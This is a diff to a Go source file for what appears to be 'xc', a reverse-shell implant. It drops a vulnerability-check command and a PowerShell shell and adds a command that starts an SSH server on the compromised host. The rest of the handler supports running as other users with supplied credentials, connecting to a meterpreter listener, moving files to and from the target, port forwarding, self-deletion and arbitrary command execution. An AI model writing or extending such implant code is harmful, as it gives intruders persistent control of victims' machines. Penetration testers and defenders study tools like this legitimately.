@@ -7,7 +7,8 @@ import (
 	"log"
 	"net"
 	"os"
-    "os/user"
+	"os/user"
+	"strconv"
 	"strings"
 	"time"
 
@@ -15,15 +16,14 @@ import (
 	"../plugins"
 	"../shell"
 	"../utils"
-	"../vulns"
 	"github.com/hashicorp/yamux"
 )
 
 func prompt(c net.Conn) {
-    cwd, err := os.Getwd()
-    if err != nil {
-        cwd = "?"
-    }
+	cwd, err := os.Getwd()
+	if err != nil {
+		cwd = "?"
+	}
 	fmt.Fprintf(c, fmt.Sprintf("[xc: %s]: ", cwd))
 }
 
@@ -49,8 +49,8 @@ func forward(host string, port string, s *yamux.Session, c net.Conn) {
 func Run(s *yamux.Session, c net.Conn) {
 	defer c.Close()
 	scanner := bufio.NewScanner(c)
-    usr, _ := user.Current()
-    homedir := usr.HomeDir
+	usr, _ := user.Current()
+	homedir := usr.HomeDir
 	// init
 	plugins.Init(c)
 	prompt(c)
@@ -65,8 +65,6 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage := "Usage:\n"
 				usage += " !runas <username> <password> <domain>\n"
 				usage += "   - restart xc with the specified user\n"
-				usage += " !runasps <username> <password> <domain>\n"
-				usage += "   - restart xc with the specified user using powershell\n"
 				usage += " !met <port>\n"
 				usage += "   - connects to a x64/meterpreter/reverse_tcp listener\n"
 				usage += " !upload <src> <dst>\n"
@@ -75,8 +73,6 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage += "   - downloads a file from the target\n"
 				usage += " !portfwd <localport> <remoteaddr> <remoteport>\n"
 				usage += "   - local portforwarding (similar to ssh -L)\n"
-				usage += " !vulns\n"
-				usage += "   - checks for common vulnerabilities\n"
 				usage += " !plugins\n"
 				usage += "   - lists available plugins\n"
 				usage += " !plugin <plugin>\n"
@@ -86,25 +82,15 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage += " !spawn <port>\n"
 				usage += "   - spawns another client on the specified port\n"
 				usage += " !shell\n"
-				usage += " !powershell\n"
+				usage += " !ssh <port>\n"
 				usage += " !exit\n"
 				c.Write([]byte(usage))
-				prompt(c)
-			case "!vulns":
-				vulns.Check(c)
 				prompt(c)
 			case "!runas":
 				if len(argv) != 4 {
 					c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
 				} else {
 					shell.RunAs(argv[1], argv[2], argv[3], c)
-				}
-				prompt(c)
-			case "!runasps":
-				if len(argv) != 4 {
-					c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
-				} else {
-					shell.RunAsPS(argv[1], argv[2], argv[3], c)
 				}
 				prompt(c)
 			case "!met":
@@ -158,20 +144,6 @@ func Run(s *yamux.Session, c net.Conn) {
 				cmd.Run()
 				log.Println("Exiting shell")
 				prompt(c)
-			case "!powershell":
-				log.Println("Entering powershell")
-				cmd, err := shell.Powershell()
-				if err != nil {
-					c.Write([]byte(err.Error() + "\n"))
-				} else {
-					rp, wp := io.Pipe()
-					cmd.Stdin = c
-					cmd.Stdout = wp
-					go io.Copy(c, rp)
-					cmd.Run()
-					log.Println("Exiting powershell")
-				}
-				prompt(c)
 			case "!plugins":
 				out := ""
 				for _, s := range plugins.List() {
@@ -219,17 +191,29 @@ func Run(s *yamux.Session, c net.Conn) {
 				log.Println("Bye!")
 				shell.Seppuku(c)
 				os.Exit(0)
-            case "cd":
-                if len(argv) == 2 {
-                    dir := strings.ReplaceAll(argv[1], "~", homedir)
-                    err := os.Chdir(dir)
-                    if err != nil {
-                        c.Write([]byte("Unable to change dir: " + err.Error() + "\n"))
-                    }
-                } else {
-                    c.Write([]byte("Usage: cd <directory>\n"))
-                }
-                prompt(c)
+			case "cd":
+				if len(argv) == 2 {
+					dir := strings.ReplaceAll(argv[1], "~", homedir)
+					err := os.Chdir(dir)
+					if err != nil {
+						c.Write([]byte("Unable to change dir: " + err.Error() + "\n"))
+					}
+				} else {
+					c.Write([]byte("Usage: cd <directory>\n"))
+				}
+				prompt(c)
+			case "!ssh":
+				if len(argv) == 2 {
+					port, err := strconv.Atoi(argv[1])
+					if err == nil {
+						shell.StartSSHServer(port, c)
+					} else {
+						fmt.Println(err)
+					}
+				} else {
+					c.Write([]byte("Usage: !ssh <port>\n"))
+				}
+				prompt(c)
 			default:
 				shell.Exec(command, c)
 				prompt(c)
